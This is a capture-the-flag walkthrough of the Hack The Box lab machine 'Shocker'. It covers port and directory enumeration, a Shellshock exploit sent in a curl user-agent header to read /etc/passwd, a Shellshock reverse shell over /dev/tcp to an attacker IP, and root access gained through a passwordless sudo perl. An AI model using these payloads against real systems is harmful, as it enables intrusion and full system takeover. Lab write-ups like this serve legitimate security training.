## Default Information
IP address : 10.10.10.56\
OS : Linux

## Enumeration
Firstly, let us enumerate all the open ports using ```Nmap```
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports

```bash
nmap -sC -sV -A -p- -T4 10.10.10.56 -vv
```

From the output of ```NMAP```, we are able to obtain the following information about the open ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| http | Apache httpd 2.4.18 (Ubuntu) | Open |
| 435	| SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | Open |

## Discovery
Firstly, we will try to visit the website to obtain some information about the website. However, there isn't much information that can be obtained from the website.
Next, we try to enumerate the directory and files on the website using ```gobuster```.
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/14 15:00:29 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.56/.hta                 (Status: 403) [Size: 290]
http://10.10.10.56/.htaccess            (Status: 403) [Size: 295]
http://10.10.10.56/.htpasswd            (Status: 403) [Size: 295]
http://10.10.10.56/cgi-bin/             (Status: 403) [Size: 294]
http://10.10.10.56/index.html           (Status: 200) [Size: 137]
http://10.10.10.56/server-status        (Status: 403) [Size: 299]
                                                                 
===============================================================
2021/08/14 15:00:57 Finished
===============================================================

```
What is special in the output of the ```gobuster``` is the presence of the ```cgi-bin``` directory which is normally used to store perl or compiled script files. So, next what we
will do is to do enumeration for the ```/cgi-bin``` directory. Form the output, we have noticed that the ```/cgin-bin``` directory actually contains a ```user.sh``` file
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x .txt,.php,.pl,.cgi,.c,.sh -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              c,sh,txt,php,pl,cgi
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/14 15:03:38 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.56/cgi-bin/.htpasswd            (Status: 403) [Size: 303]
http://10.10.10.56/cgi-bin/.htaccess.c          (Status: 403) [Size: 305]
http://10.10.10.56/cgi-bin/.hta.cgi             (Status: 403) [Size: 302]
http://10.10.10.56/cgi-bin/.htpasswd.txt        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.htaccess.sh         (Status: 403) [Size: 306]
http://10.10.10.56/cgi-bin/.hta.c               (Status: 403) [Size: 300]
http://10.10.10.56/cgi-bin/.htpasswd.php        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.htaccess            (Status: 403) [Size: 303]
http://10.10.10.56/cgi-bin/.hta                 (Status: 403) [Size: 298]
http://10.10.10.56/cgi-bin/.htpasswd.pl         (Status: 403) [Size: 306]
http://10.10.10.56/cgi-bin/.htaccess.txt        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.hta.sh              (Status: 403) [Size: 301]
http://10.10.10.56/cgi-bin/.htpasswd.cgi        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.htaccess.php        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.hta.txt             (Status: 403) [Size: 302]
http://10.10.10.56/cgi-bin/.htpasswd.c          (Status: 403) [Size: 305]
http://10.10.10.56/cgi-bin/.htaccess.pl         (Status: 403) [Size: 306]
http://10.10.10.56/cgi-bin/.hta.php             (Status: 403) [Size: 302]
http://10.10.10.56/cgi-bin/.htpasswd.sh         (Status: 403) [Size: 306]
http://10.10.10.56/cgi-bin/.htaccess.cgi        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.hta.pl              (Status: 403) [Size: 301]
http://10.10.10.56/cgi-bin/user.sh              (Status: 200) [Size: 118]
                                                                         
===============================================================
2021/08/14 15:06:40 Finished
===============================================================
```
We will just keep this ```/cgi-bin/user.sh``` file in mind for now and carry on with a `Nikto` scan, which detected that we are using an old version of ```Apache```.
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.56
+ Target Hostname:    10.10.10.56
+ Target Port:        80
+ Start Time:         2021-08-14 13:49:49 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
```
With the information that we are using an outdated ```Apache``` webserver and the presence of a ```cgi-bin``` and a little hint from the box's name, we suspect that the box is vulnerable to ```shellshock``` vulnerability. So, now we will test a POC for shellshock.
```
┌──(kali㉿kali)-[~]
└─$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
```
Now, we have successfully exfiltrated the ```/etc/passwd``` file which proved that our POC is successful. So, next we will create a reverse shell to connect to the attacker machine. To do that, we will create a listener on our attacking machine and modify the payload as follows:
```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.250/3000 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```
Afterwards, we would have successfully created a reverse shell and all that is left for us to do is to stabilize the shell
```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000       
listening on [any] 3000 ...
connect to [10.10.16.250] from (UNKNOWN) [10.10.10.56] 56940
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<-bin$ python3 -c 'import pty; pty.spawn("/bin/bash)'                        
shelly@Shocker:/usr/lib/cgi-bin$ export TERM=xterm
export TERM=xterm
shelly@Shocker:/usr/lib/cgi-bin$ stty cols 132 rows 34
stty cols 132 rows 34
shelly@Shocker:/usr/lib/cgi-bin$ 
```

## Obtaining user flag
```
shelly@Shocker:/$ ls
ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
shelly@Shocker:/$ cd home
cd home
shelly@Shocker:/home$ ls
ls
shelly
shelly@Shocker:/home$ cd shelly
cd shelly
shelly@Shocker:/home/shelly$ ls
ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
<Redacted user flag>
```

## Obtaining system flag
However, we are not done yet! We have not obtainted our system flag yet. To do so, let's first find the programs with root privileges using ```sudo -l```. From the output, we realized that /usr/bin/perl is able to execute root privileges without any password.
```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
Now all we need to do is to use ```perl``` to execute a ```/bin/bash``` command and obtain the root flag.
```
shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
sudo /usr/bin/perl -e 'exec "/bin/bash";'
root@Shocker:/home/shelly# cd ..
cd ..
root@Shocker:/home# cd ..
cd ..
root@Shocker:~# cat root.txt
cat root.txt
<Redacted system flag>
root@Shocker:~# 
```
